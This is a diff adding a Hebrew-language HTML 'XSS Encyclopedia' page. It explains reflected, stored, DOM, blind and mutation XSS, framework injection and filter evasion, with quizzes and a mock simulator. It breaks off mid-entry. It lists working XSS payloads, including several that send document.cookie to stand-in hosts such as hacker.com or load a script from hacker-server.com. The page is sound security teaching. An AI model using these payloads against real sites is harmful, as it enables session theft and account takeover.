@@ -1,0 +1,1055 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Encyclopedia | מאגר ידע מקיף</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500;700&family=Fira+Code:wght@400;500;600&display=swap');
+
+        :root {
+            --bg-color: #0f172a;
+            --sidebar-bg: #1e293b;
+            --text-primary: #e2e8f0;
+            --text-secondary: #94a3b8;
+            --accent: #3b82f6;
+            --code-bg: #0d1117;
+        }
+
+        body {
+            font-family: 'Rubik', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-primary);
+        }
+
+        /* Scrollbar Styling */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg-color); }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #475569; }
+
+        /* Code Blocks */
+        .code-snippet {
+            font-family: 'Fira Code', monospace;
+            direction: ltr;
+            text-align: left;
+            background-color: var(--code-bg);
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 1rem;
+            overflow-x: auto;
+            color: #c9d1d9;
+            font-size: 0.85rem;
+            line-height: 1.5;
+            position: relative;
+        }
+
+        .syntax-tag { color: #7ee787; }
+        .syntax-attr { color: #79c0ff; }
+        .syntax-string { color: #a5d6ff; }
+        .syntax-comment { color: #8b949e; font-style: italic; }
+        .syntax-keyword { color: #ff7b72; }
+        
+        /* Navigation Item Active State */
+        .nav-item.active {
+            background-color: rgba(59, 130, 246, 0.1);
+            border-right: 3px solid var(--accent);
+            color: white;
+        }
+
+        .category-badge {
+            font-size: 0.65rem;
+            padding: 2px 6px;
+            border-radius: 4px;
+            text-transform: uppercase;
+            font-weight: 700;
+            letter-spacing: 0.05em;
+        }
+
+        /* כפתור העתקה לקוד */
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            left: 0.5rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #1e293b;
+            border: 1px solid #334155;
+            color: #cbd5e1;
+            border-radius: 6px;
+            padding: 4px 8px;
+            font-size: 0.75rem;
+            opacity: 0.7;
+            transition: all 0.2s ease;
+        }
+
+        .copy-btn:hover { opacity: 1; border-color: var(--accent); color: white; }
+
+        .copy-tooltip {
+            position: absolute;
+            top: -1.75rem;
+            left: 0.5rem;
+            background: #0f172a;
+            border: 1px solid #334155;
+            color: #a5b4fc;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-size: 0.7rem;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.35);
+            pointer-events: none;
+            opacity: 0;
+            transform: translateY(4px);
+            transition: all 0.15s ease;
+        }
+
+        .copy-tooltip.show { opacity: 1; transform: translateY(0); }
+    </style>
+</head>
+<body class="h-screen flex flex-col overflow-hidden">
+
+    <!-- Top Bar -->
+    <header class="bg-slate-900 border-b border-slate-800 h-16 flex items-center justify-between px-6 flex-shrink-0 z-20">
+        <div class="flex items-center gap-3">
+            <div class="bg-blue-600/20 p-2 rounded-lg border border-blue-500/30">
+                <i data-lucide="database-zap" class="text-blue-400 w-6 h-6"></i>
+            </div>
+            <div>
+                <h1 class="font-bold text-lg text-white tracking-tight">XSS Encyclopedia</h1>
+                <p class="text-[10px] text-slate-400 uppercase tracking-widest">Payload Knowledge Base</p>
+            </div>
+        </div>
+        <div class="flex items-center gap-4 text-sm">
+            <span class="text-slate-500 hidden md:inline">מדריך טכני לחוקרי אבטחה</span>
+        </div>
+    </header>
+
+    <!-- Main Layout -->
+    <div class="flex flex-1 overflow-hidden">
+        
+        <!-- Sidebar -->
+        <aside class="w-72 bg-slate-800 border-l border-slate-700 flex flex-col overflow-y-auto flex-shrink-0">
+            <div class="p-4 pb-2 space-y-4 sticky top-0 bg-slate-800 z-10">
+                <label class="block text-[11px] text-slate-500 mb-2 font-semibold tracking-wide">חיפוש</label>
+                <div class="relative">
+                    <i data-lucide="search" class="absolute left-3 top-2.5 w-4 h-4 text-slate-500"></i>
+                    <input id="nav-search" type="text" placeholder="חיפוש וקטור תקיפה..." class="w-full rounded-lg bg-slate-900 border border-slate-700 text-xs text-slate-200 px-9 py-2 focus:outline-none focus:ring-2 focus:ring-blue-600" />
+                </div>
+            </div>
+            <div class="p-4 space-y-6">
+                
+                <!-- Section 1 -->
+                <div>
+                    <h3 class="text-xs font-bold text-slate-500 uppercase tracking-wider mb-3 px-2">הסוגים הנפוצים</h3>
+                    <nav class="space-y-1" id="nav-common">
+                        <!-- Injected via JS -->
+                    </nav>
+                </div>
+
+                <!-- Section 2 -->
+                <div>
+                    <h3 class="text-xs font-bold text-slate-500 uppercase tracking-wider mb-3 px-2">מתקדם & חמקמק</h3>
+                    <nav class="space-y-1" id="nav-advanced">
+                        <!-- Injected via JS -->
+                    </nav>
+                </div>
+
+                <!-- Section 3.5 -->
+                <div>
+                    <h3 class="text-xs font-bold text-slate-500 uppercase tracking-wider mb-3 px-2">Frameworks & אקזוטי</h3>
+                    <nav class="space-y-1" id="nav-frameworks">
+                        <!-- Injected via JS -->
+                    </nav>
+                </div>
+
+                <!-- Section 3 -->
+                <div>
+                    <h3 class="text-xs font-bold text-slate-500 uppercase tracking-wider mb-3 px-2">טכניקות עקיפה</h3>
+                    <nav class="space-y-1" id="nav-evasion">
+                        <!-- Injected via JS -->
+                    </nav>
+                </div>
+
+                <!-- Section Defense -->
+                <div>
+                    <h3 class="text-xs font-bold text-slate-500 uppercase tracking-wider mb-3 px-2">הגנות</h3>
+                    <nav class="space-y-1" id="nav-defense">
+                        <!-- Injected via JS -->
+                    </nav>
+                </div>
+
+                <!-- Section Tools -->
+                <div>
+                    <h3 class="text-xs font-bold text-slate-500 uppercase tracking-wider mb-3 px-2">כלים</h3>
+                    <nav class="space-y-1" id="nav-tools">
+                        <!-- Injected via JS -->
+                    </nav>
+                </div>
+
+            </div>
+        </aside>
+
+        <!-- Content Area -->
+        <main class="flex-1 overflow-y-auto bg-[#0f172a] relative w-full p-6 md:p-10" id="main-content">
+            <!-- Dynamic Content -->
+        </main>
+
+    </div>
+
+    <script>
+        // Database of Vulnerabilities
+        const vulns = {
+            common: [
+                {
+                    id: 'reflected',
+                    title: 'Reflected XSS',
+                    badge: 'Server-Side',
+                    badgeColor: 'bg-orange-500/20 text-orange-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">Reflected XSS</h2>
+                        <p class="text-slate-400 mb-8 leading-relaxed">
+                            הצורה הקלאסית ביותר. מתרחשת כאשר האפליקציה מקבלת קלט בבקשת HTTP (בדרך כלל פרמטר GET) ומשקפת אותו חזרה בצורה לא בטוחה.
+                        </p>
+
+                        <div class="space-y-8">
+                            <!-- Scenario -->
+                            <div class="bg-slate-800/50 p-6 rounded-xl border border-slate-700">
+                                <h3 class="text-lg font-bold text-white mb-4 flex items-center gap-2">
+                                    <i data-lucide="target" class="w-5 h-5 text-blue-400"></i> וקטור תקיפה
+                                </h3>
+                                <p class="text-sm text-slate-400 mb-4">
+                                    התוקף צריך לגרום לקורבן ללחוץ על לינק ייעודי. הקוד הזדוני נמצא בתוך ה-URL.
+                                </p>
+                                <div class="code-snippet">
+                                    https://example.com/search?q=<span class="syntax-tag">&lt;script&gt;</span><span class="syntax-keyword">alert</span>(document.cookie)<span class="syntax-tag">&lt;/script&gt;</span>
+                                </div>
+                            </div>
+
+                            <!-- Real World Example -->
+                            <div class="bg-slate-900 border border-slate-800 rounded-xl p-4">
+                                <h4 class="text-sm font-bold text-white mb-3 flex items-center gap-2"><i data-lucide="globe" class="w-4 h-4 text-emerald-400"></i> דוגמה מהחיים</h4>
+                                <div class="bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs text-slate-200 font-mono flex items-center gap-2">
+                                    <i data-lucide="navigation" class="w-4 h-4 text-slate-500"></i>
+                                    <span class="break-all">https://shop.example.com/search?query=%3Cscript%3Ealert(1)%3C/script%3E</span>
+                                </div>
+                            </div>
+
+                            <!-- Payloads -->
+                            <div>
+                                <h3 class="text-lg font-bold text-white mb-4">Payloads נפוצים</h3>
+                                <div class="grid gap-4">
+                                    
+                                    <div class="bg-slate-900 border border-slate-800 rounded-lg p-4">
+                                        <div class="flex justify-between items-center mb-2">
+                                            <span class="text-xs font-mono text-slate-500">Standard Script Tag</span>
+                                            <span class="text-xs text-green-500 bg-green-900/20 px-2 py-1 rounded">בסיסי</span>
+                                        </div>
+                                        <div class="code-snippet">
+                                            <span class="syntax-tag">&lt;script&gt;</span>alert(1)<span class="syntax-tag">&lt;/script&gt;</span>
+                                        </div>
+                                    </div>
+
+                                    <div class="bg-slate-900 border border-slate-800 rounded-lg p-4">
+                                        <div class="flex justify-between items-center mb-2">
+                                            <span class="text-xs font-mono text-slate-500">SVG OnLoad (לרוב לא נחסם)</span>
+                                            <span class="text-xs text-yellow-500 bg-yellow-900/20 px-2 py-1 rounded">עוקף פילטרים</span>
+                                        </div>
+                                        <div class="code-snippet">
+                                            <span class="syntax-tag">&lt;svg/onload=</span>alert(1)<span class="syntax-tag">&gt;</span>
+                                        </div>
+                                    </div>
+
+                                    <div class="bg-slate-900 border border-slate-800 rounded-lg p-4">
+                                        <div class="flex justify-between items-center mb-2">
+                                            <span class="text-xs font-mono text-slate-500">Body OnLoad (כאשר אין תגיות סקריפט)</span>
+                                        </div>
+                                        <div class="code-snippet">
+                                            <span class="syntax-tag">&lt;body onpageshow=</span>alert(1)<span class="syntax-tag">&gt;</span>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Playground -->
+                                <div class="mt-10 bg-slate-800/60 border border-slate-700 rounded-xl p-6" id="playground-section">
+                                    <div class="flex items-center gap-2 mb-4">
+                                        <i data-lucide="terminal" class="w-5 h-5 text-amber-400"></i>
+                                        <h3 class="text-lg font-bold text-white">סימולטור בטוח</h3>
+                                    </div>
+                                    <p class="text-sm text-slate-400 mb-4">הקלד Payload ולחץ חיפוש כדי לראות איך הוא מוצג. הקוד לא יורץ בפועל.</p>
+                                    <div class="grid gap-4 md:grid-cols-[2fr,1fr] items-start">
+                                        <div class="space-y-3">
+                                            <label class="text-xs text-slate-500">תיבת חיפוש מדומה</label>
+                                            <div class="flex gap-2">
+                                                <input id="playground-input" dir="ltr" type="text" class="w-full rounded-lg bg-slate-900 border border-slate-700 text-sm text-slate-200 px-3 py-2 focus:outline-none focus:ring-2 focus:ring-amber-500 text-left" placeholder="לדוגמה: &lt;script&gt;alert(1)&lt;/script&gt;" />
+                                                <button id="playground-btn" class="px-4 py-2 bg-amber-500 text-slate-900 text-sm font-bold rounded-lg hover:bg-amber-400 transition">חפש</button>
+                                            </div>
+                                            <div class="relative">
+                                                <div id="playground-toast" class="hidden absolute -top-10 left-0 bg-red-600 text-white text-xs font-semibold px-3 py-2 rounded shadow-lg">בום! הקוד הזדוני רץ בהצלחה!</div>
+                                            </div>
+                                            <div class="bg-slate-900 border border-slate-800 rounded-lg p-4 min-h-[90px] text-left" id="playground-result" dir="ltr">
+                                                <p class="text-sm text-slate-500" dir="ltr">התוצאה תופיע כאן.</p>
+                                            </div>
+                                        </div>
+                                        <div class="bg-slate-900/70 border border-slate-800 rounded-lg p-4 text-sm text-slate-300">
+                                            <h4 class="text-xs font-bold text-slate-400 mb-2">זיהוי זדוניות</h4>
+                                            <ul class="list-disc list-inside space-y-1 text-xs text-slate-400">
+                                                <li>מחפשים <code>&lt;script&gt;</code> או <code>onerror=</code>.</li>
+                                                <li>מציגים Toast אדום במקום להריץ את הקוד.</li>
+                                                <li>טקסט רגיל יוצג כפי שהוא.</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    `
+                },
+                {
+                    id: 'stored',
+                    title: 'Stored XSS',
+                    badge: 'Database',
+                    badgeColor: 'bg-red-500/20 text-red-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">Stored XSS (Persistent)</h2>
+                        <p class="text-slate-400 mb-8 leading-relaxed">
+                            הסוג המסוכן ביותר. הקוד מוזרק פעם אחת, נשמר בבסיס הנתונים, ונטען אצל כל משתמש שנכנס לדף הרלוונטי.
+                        </p>
+
+                        <div class="space-y-8">
+                            <!-- Scenario -->
+                            <div class="bg-slate-800/50 p-6 rounded-xl border border-slate-700">
+                                <h3 class="text-lg font-bold text-white mb-4 flex items-center gap-2">
+                                    <i data-lucide="target" class="w-5 h-5 text-red-400"></i> שימוש אסטרטגי
+                                </h3>
+                                <p class="text-sm text-slate-400 mb-4">
+                                    בדרך כלל משמש לגניבת Session המונית או יצירת "תולעים" (Worms). המיקומים הנפוצים: שדות פרופיל, תגובות בפורומים, שמות קבצים בהעלאה.
+                                </p>
+                            </div>
+
+                            <!-- Real World Example -->
+                            <div class="bg-slate-900 border border-slate-800 rounded-xl p-4">
+                                <h4 class="text-sm font-bold text-white mb-3 flex items-center gap-2"><i data-lucide="globe" class="w-4 h-4 text-emerald-400"></i> דוגמה מהחיים</h4>
+                                <div class="bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs text-slate-200 font-mono flex items-center gap-2">
+                                    <i data-lucide="message-circle" class="w-4 h-4 text-slate-500"></i>
+                                    <span class="break-all">פרופיל משתמש מציג שם שמור בבסיס הנתונים: <span class="syntax-tag">&lt;img src=x onerror=alert('XSS')&gt;</span></span>
+                                </div>
+                            </div>
+
+                            <!-- Payloads -->
+                            <div>
+                                <h3 class="text-lg font-bold text-white mb-4">Payloads להזרקה מתמדת</h3>
+                                <div class="grid gap-4">
+                                    
+                                    <div class="bg-slate-900 border border-slate-800 rounded-lg p-4">
+                                        <div class="flex justify-between items-center mb-2">
+                                            <span class="text-xs font-mono text-slate-500">Image Error Vector (לפרופילים)</span>
+                                        </div>
+                                        <div class="code-snippet">
+                                            <span class="syntax-tag">&lt;img src=</span>x <span class="syntax-attr">onerror=</span><span class="syntax-string">"fetch('http://hacker.com?c='+document.cookie)"</span><span class="syntax-tag">&gt;</span>
+                                        </div>
+                                    </div>
+
+                                    <div class="bg-slate-900 border border-slate-800 rounded-lg p-4">
+                                        <div class="flex justify-between items-center mb-2">
+                                            <span class="text-xs font-mono text-slate-500">Iframe Injection (נסתר)</span>
+                                        </div>
+                                        <div class="code-snippet">
+                                            <span class="syntax-tag">&lt;iframe src=</span><span class="syntax-string">"javascript:alert(1)"</span> <span class="syntax-attr">style=</span><span class="syntax-string">"opacity:0"</span><span class="syntax-tag">&gt;&lt;/iframe&gt;</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="mt-8 bg-slate-800/50 border border-slate-700 rounded-lg p-4">
+                                <h4 class="text-sm font-bold text-white mb-2">בחן את עצמך</h4>
+                                <p class="text-sm text-slate-300 mb-3">מהו סיכון עיקרי של Stored XSS?</p>
+                                <div class="space-y-2 text-sm text-slate-300" data-quiz-id="quiz-stored">
+                                    <label class="flex items-center gap-2"><input type="radio" name="quiz-stored" value="a" class="text-blue-500">השפעה חד פעמית על גולש בודד בלבד.</label>
+                                    <label class="flex items-center gap-2"><input type="radio" name="quiz-stored" value="b" class="text-blue-500">הרצה חוזרת אצל כל משתמש שנכנס לדף הפגוע.</label>
+                                    <label class="flex items-center gap-2"><input type="radio" name="quiz-stored" value="c" class="text-blue-500">הגבלת הגישה ל-Admin בלבד.</label>
+                                    <button class="mt-3 px-3 py-2 bg-blue-600 text-white text-xs font-semibold rounded" data-quiz-check="quiz-stored">בדוק</button>
+                                    <div class="text-xs mt-2 hidden" data-quiz-feedback="quiz-stored"></div>
+                                </div>
+                            </div>
+                        </div>
+                    `
+                },
+                {
+                    id: 'dom',
+                    title: 'DOM-Based XSS',
+                    badge: 'Client-Side',
+                    badgeColor: 'bg-purple-500/20 text-purple-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">DOM-Based XSS</h2>
+                        <p class="text-slate-400 mb-8 leading-relaxed">
+                            מתקפה שמתרחשת כולה בדפדפן הלקוח. השרת לעיתים אפילו לא רואה את הקוד הזדוני (למשל אם משתמשים ב-URL Fragment אחרי ה-#).
+                        </p>
+
+                        <div class="bg-slate-800/50 p-6 rounded-xl border border-slate-700 mb-8">
+                            <h3 class="text-lg font-bold text-white mb-2">המכניקה (Source & Sink)</h3>
+                            <ul class="list-disc list-inside text-sm text-slate-400 space-y-2">
+                                <li><strong>Source:</strong> <code>location.hash</code>, <code>window.name</code>, <code>document.referrer</code></li>
+                                <li><strong>Sink:</strong> <code>innerHTML</code>, <code>document.write</code>, <code>eval()</code></li>
+                            </ul>
+                        </div>
+
+                        <div>
+                            <h3 class="text-lg font-bold text-white mb-4">טכניקות ניצול</h3>
+                            <div class="bg-slate-900 border border-slate-800 rounded-lg p-4 mb-4">
+                                <div class="flex justify-between items-center mb-2">
+                                    <span class="text-xs font-mono text-slate-500">Hash Injection (לא נשלח לשרת)</span>
+                                </div>
+                                <div class="code-snippet">
+                                    https://vulnerable.com/#<span class="syntax-tag">&lt;img src=</span>x <span class="syntax-attr">onerror=</span>alert(1)<span class="syntax-tag">&gt;</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="mt-8 bg-slate-800/50 border border-slate-700 rounded-lg p-4">
+                            <h4 class="text-sm font-bold text-white mb-2">בחן את עצמך</h4>
+                            <p class="text-sm text-slate-300 mb-3">למה DOM XSS לא תמיד נראה ב-logs של השרת?</p>
+                            <div class="space-y-2 text-sm text-slate-300" data-quiz-id="quiz-dom">
+                                <label class="flex items-center gap-2"><input type="radio" name="quiz-dom" value="a" class="text-blue-500">כי ההתקפה דורשת הרשאות root.</label>
+                                <label class="flex items-center gap-2"><input type="radio" name="quiz-dom" value="b" class="text-blue-500">כי הקוד הזדוני מורץ כולו בצד הלקוח ללא שליחת הבקשה לשרת.</label>
+                                <label class="flex items-center gap-2"><input type="radio" name="quiz-dom" value="c" class="text-blue-500">כי הדפדפן חוסם כל HTML ב-hash.</label>
+                                <button class="mt-3 px-3 py-2 bg-blue-600 text-white text-xs font-semibold rounded" data-quiz-check="quiz-dom">בדוק</button>
+                                <div class="text-xs mt-2 hidden" data-quiz-feedback="quiz-dom"></div>
+                            </div>
+                        </div>
+                    `
+                }
+            ],
+            advanced: [
+                {
+                    id: 'blind',
+                    title: 'Blind XSS',
+                    badge: 'Invisible',
+                    badgeColor: 'bg-pink-500/20 text-pink-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">Blind XSS</h2>
+                        <p class="text-slate-400 mb-8 leading-relaxed">
+                            סוג של Stored XSS שבו התוקף לא רואה את התוצאה באתר. הקוד מיועד להתבצע במערכת אחרת, בדרך כלל מערכת ניהול (Admin Panel) או לוגים פנימיים.
+                        </p>
+
+                        <div class="space-y-8">
+                            <!-- Scenario -->
+                            <div class="bg-slate-800/50 p-6 rounded-xl border border-slate-700">
+                                <h3 class="text-lg font-bold text-white mb-4 flex items-center gap-2">
+                                    <i data-lucide="eye-off" class="w-5 h-5 text-pink-400"></i> תרחיש תקיפה
+                                </h3>
+                                <p class="text-sm text-slate-400 mb-4">
+                                    1. התוקף ממלא טופס "צור קשר" עם Payload זדוני.<br>
+                                    2. ההודעה נשמרת בדאטה-בייס.<br>
+                                    3. מנהל המערכת נכנס לפאנל הניהול לקרוא הודעות.<br>
+                                    4. הסקריפט רץ בדפדפן של המנהל וגונב את ה-Admin Cookies.
+                                </p>
+                            </div>
+
+                            <!-- Payloads -->
+                            <div>
+                                <h3 class="text-lg font-bold text-white mb-4">Payloads לניטור מרחוק (OOB)</h3>
+                                <p class="text-xs text-slate-500 mb-2">מכיוון שהתוקף לא רואה את המסך, חייבים להשתמש בקריאה חיצונית (Out of Band).</p>
+                                
+                                <div class="grid gap-4">
+                                    <div class="bg-slate-900 border border-slate-800 rounded-lg p-4">
+                                        <div class="code-snippet">
+                                            <span class="syntax-comment">// טעינת סקריפט חיצוני שמתריע לתוקף</span><br>
+                                            <span class="syntax-tag">&lt;script src=</span><span class="syntax-string">"//hacker-server.com/capture.js"</span><span class="syntax-tag">&gt;&lt;/script&gt;</span>
+                                        </div>
+                                    </div>
+                                    <div class="bg-slate-900 border border-slate-800 rounded-lg p-4">
+                                        <div class="code-snippet">
+                                            <span class="syntax-comment">// שליחת מידע ללא סקריפט (Content Policy Bypass)</span><br>
+                                            <span class="syntax-tag">&lt;img src=</span>x <span class="syntax-attr">onerror=</span><span class="syntax-string">"this.src='http://hacker.com/?cookie='+document.cookie"</span><span class="syntax-tag">&gt;</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    `
+                },
+                {
+                    id: 'mxss',
+                    title: 'mXSS (Mutation)',
+                    badge: 'Browser Logic',
+                    badgeColor: 'bg-indigo-500/20 text-indigo-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">Mutation XSS (mXSS)</h2>
+                        <p class="text-slate-400 mb-8 leading-relaxed">
+                            טכניקה מתוחכמת המנצלת את ההבדל בין איך שספריית האבטחה (Sanitizer) קוראת HTML לבין איך שהדפדפן קורא אותו. הקוד נראה בטוח כשהוא נכנס, אבל הדפדפן "מתקן" אותו (Mutate) ומחזיר אותו להיות זדוני.
+                        </p>
+
+                        <div class="bg-slate-800/50 p-6 rounded-xl border border-slate-700 mb-8">
+                            <h3 class="text-lg font-bold text-white mb-2">דוגמה לשינוי מבנה</h3>
+                            <p class="text-sm text-slate-400 mb-4">
+                                הכנסת HTML שבור בכוונה כדי לבלבל את ה-Parser.
+                            </p>
+                            <div class="code-snippet mb-2">
+                                <span class="syntax-comment">// קלט שנראה בטוח (ה-SVG לא נסגר טוב)</span><br>
+                                <span class="syntax-tag">&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;</span>
+                            </div>
+                            <p class="text-xs text-slate-500 mt-2">
+                                דפדפנים מסוימים יוציאו את ה-img מתוך ה-title בעת הרינדור, והקוד ירוץ.
+                            </p>
+                        </div>
+                    `
+                }
+            ],
+            frameworks: [
+                {
+                    id: 'csti',
+                    title: 'Angular/Vue/React Injection',
+                    badge: 'Client-Side',
+                    badgeColor: 'bg-sky-500/20 text-sky-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">Client-Side Template Injection (CSTI)</h2>
+                        <p class="text-slate-400 mb-8 leading-relaxed">
+                            כאשר פריימוורקים כמו Angular/Vue/React מרנדרים ביטויי תבנית מתוך קלט משתמש, ניתן להזריק ביטויים דינמיים כגון {{constructor.constructor('alert(1)')()}} ולגרום להרצת JavaScript.
+                        </p>
+                        <div class="bg-slate-900 border border-slate-800 rounded-lg p-5 mb-5">
+                            <h4 class="text-sm font-bold text-white mb-3">מחרוזת טיפוסית</h4>
+                            <div class="code-snippet">{{constructor.constructor('alert(1)')()}}</div>
+                            <p class="text-xs text-slate-500 mt-2">אם הקלט מוכנס ישירות ל-Template בלי Sanitization, הביטוי ירוץ בדפדפן.</p>
+                        </div>
+                        <div class="bg-slate-800/50 p-5 rounded-xl border border-slate-700">
+                            <h4 class="text-sm font-bold text-white mb-3">הקשר נפוץ</h4>
+                            <ul class="list-disc list-inside text-sm text-slate-400 space-y-2">
+                                <li>AngularJS ישן עם ng-bind או {{ }} ללא ngSanitize.</li>
+                                <li>Vue עם v-html שמקבל Markdown לא מסונן.</li>
+                                <li>React כאשר dangerouslySetInnerHTML משמש עם קלט משתמש.</li>
+                            </ul>
+                        </div>
+                    `
+                },
+                {
+                    id: 'file-upload',
+                    title: 'File Upload XSS',
+                    badge: 'Storage',
+                    badgeColor: 'bg-amber-500/20 text-amber-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">File Upload XSS</h2>
+                        <p class="text-slate-400 mb-8 leading-relaxed">
+                            הזרקת XSS דרך קבצים שנראים תמימים. דוגמאות בולטות: קובץ SVG עם onload, או מטאדאטה של PDF שמכיל JavaScript.
+                        </p>
+                        <div class="grid md:grid-cols-2 gap-4">
+                            <div class="bg-slate-900 border border-slate-800 rounded-lg p-4">
+                                <h4 class="text-xs font-bold text-slate-300 mb-2">SVG עם onload</h4>
+                                <div class="code-snippet">
+<span class="syntax-tag">&lt;svg xmlns=</span><span class="syntax-string">"http://www.w3.org/2000/svg"</span> <span class="syntax-attr">onload=</span>alert(1)<span class="syntax-tag">&gt;&lt;/svg&gt;</span>
+                                </div>
+                            </div>
+                            <div class="bg-slate-900 border border-slate-800 rounded-lg p-4">
+                                <h4 class="text-xs font-bold text-slate-300 mb-2">מטאדאטה ב-PDF</h4>
+                                <div class="code-snippet">
+<span class="syntax-comment">% PDF metadata</span><br>
+/Title (javascript:alert(1))
+                                </div>
+                                <p class="text-[11px] text-slate-500 mt-2">אם ה-PDF נפתח ב-viewer שמריץ JS, ההקפצה תופיע.</p>
+                            </div>
+                        </div>
+                    `
+                },
+                {
+                    id: 'prototype-pollution',
+                    title: 'Prototype Pollution',
+                    badge: 'Logic',
+                    badgeColor: 'bg-teal-500/20 text-teal-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">Prototype Pollution → XSS</h2>
+                        <p class="text-slate-400 mb-8 leading-relaxed">
+                            זיהום של Object.prototype באמצעות פרמטרים כמו __proto__ מאפשר להחדיר ערכים שיטענו בהמשך בתור HTML. כאשר ספריות UI משתמשות בערכים אלה ל-innersHTML, מתקבלת הזרקת XSS.
+                        </p>
+                        <div class="code-snippet mb-3">
+                            <span class="syntax-comment">// בקשת JSON</span><br>
+                            {"__proto__":{"dangerous":"&lt;script&gt;alert(1)&lt;/script&gt;"}}
+                        </div>
+                        <p class="text-sm text-slate-400">אם הקוד בהמשך עושה element.innerHTML = user.dangerous, הפולושן מפעיל את הסקריפט.</p>
+                    `
+                },
+                {
+                    id: 'markdown',
+                    title: 'Markdown XSS',
+                    badge: 'Parser',
+                    badgeColor: 'bg-lime-500/20 text-lime-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">Markdown XSS</h2>
+                        <p class="text-slate-400 mb-8 leading-relaxed">
+                            פרסרי Markdown שונים מאפשרים קישורים או HTML חלקי. עקיפות נפוצות כוללות שימוש ב-javascript: בתוך קישור, או הכנסת HTML גולמי כאשר הוא לא מנוטרל.
+                        </p>
+                        <div class="bg-slate-900 border border-slate-800 rounded-lg p-4 mb-4">
+                            <h4 class="text-xs font-bold text-slate-300 mb-2">קישור מסוכן</h4>
+                            <div class="code-snippet">[פתיחת אלרט](javascript:alert(1))</div>
+                        </div>
+                        <div class="bg-slate-900 border border-slate-800 rounded-lg p-4">
+                            <h4 class="text-xs font-bold text-slate-300 mb-2">HTML גולמי</h4>
+                            <div class="code-snippet"><span class="syntax-tag">&lt;img src=</span>x <span class="syntax-attr">onerror=</span>alert(1)<span class="syntax-tag">&gt;</span></div>
+                            <p class="text-[11px] text-slate-500 mt-2">ב-renderers שמאפשרים HTML (למשל markdown-it ללא sanitize), הקוד ירוץ.</p>
+                        </div>
+                    `
+                }
+            ],
+            evasion: [
+                {
+                    id: 'polyglot',
+                    title: 'Polyglots',
+                    badge: 'Multicontext',
+                    badgeColor: 'bg-emerald-500/20 text-emerald-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">XSS Polyglots</h2>
+                        <p class="text-slate-400 mb-8 leading-relaxed">
+                            מחרוזות תקיפה שנועדו לעבוד במספר רב של הקשרים (Attributes, Script blocks, HTML tags) בו זמנית. הן שימושיות כשיש בדיקת חדירות "קופסה שחורה" ולא יודעים איפה הקלט מוזרק.
+                        </p>
+
+                        <div class="bg-slate-900 border border-slate-800 rounded-lg p-4 mb-6">
+                            <h3 class="text-sm font-bold text-white mb-3">ה-Polyglot המפורסם של 0xSobky</h3>
+                            <div class="code-snippet break-all whitespace-pre-wrap">
+javascript://%250Aalert(1)//"/*\'/*\'/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+                            </div>
+                        </div>
+
+                        <div class="bg-slate-800/50 p-6 rounded-xl border border-slate-700">
+                            <h3 class="text-lg font-bold text-white mb-2">למה זה עובד?</h3>
+                            <ul class="list-disc list-inside text-sm text-slate-400 space-y-2">
+                                <li><code>--&gt;</code> סוגר הערות HTML.</li>
+                                <li><code>&lt;/title&gt;, &lt;/style&gt;</code> סוגר בלוקים של טקסט.</li>
+                                <li><code>"/*\'/*</code> מטפל במחרוזות בתוך JS.</li>
+                            </ul>
+                        </div>
+                    `
+                },
+                {
+                    id: 'filter_bypass',
+                    title: 'Filter Evasion',
+                    badge: 'WAF Bypass',
+                    badgeColor: 'bg-cyan-500/20 text-cyan-400',
+                    content: `
+                        <h2 class="text-3xl font-bold mb-4">עקיפת פילטרים</h2>
+                        <p class="text-slate-400 mb-8 leading-relaxed">
+                            כאשר האתר חוסם מילים כמו "script" או "alert", התוקף משתמש בשיטות יצירתיות כדי לעקוף את החסימה.
+                        </p>
+
+                        <div class="grid md:grid-cols-2 gap-4">
+                            <div class="bg-slate-900 border border-slate-800 rounded-lg p-4">
+                                <h4 class="text-xs font-bold text-slate-300 mb-2">שינוי אותיות (Case Sensitivity)</h4>
+                                <div class="code-snippet">
+                                    <span class="syntax-tag">&lt;ScRiPt&gt;</span>alert(1)<span class="syntax-tag">&lt;/sCrIpT&gt;</span>
+                                </div>
+                            </div>
+
+                            <div class="bg-slate-900 border border-slate-800 rounded-lg p-4">
+                                <h4 class="text-xs font-bold text-slate-300 mb-2">שימוש ב-Eval/Atob</h4>
+                                <div class="code-snippet">
+                                    <span class="syntax-comment">// קידוד הפקודה ב-Base64</span><br>
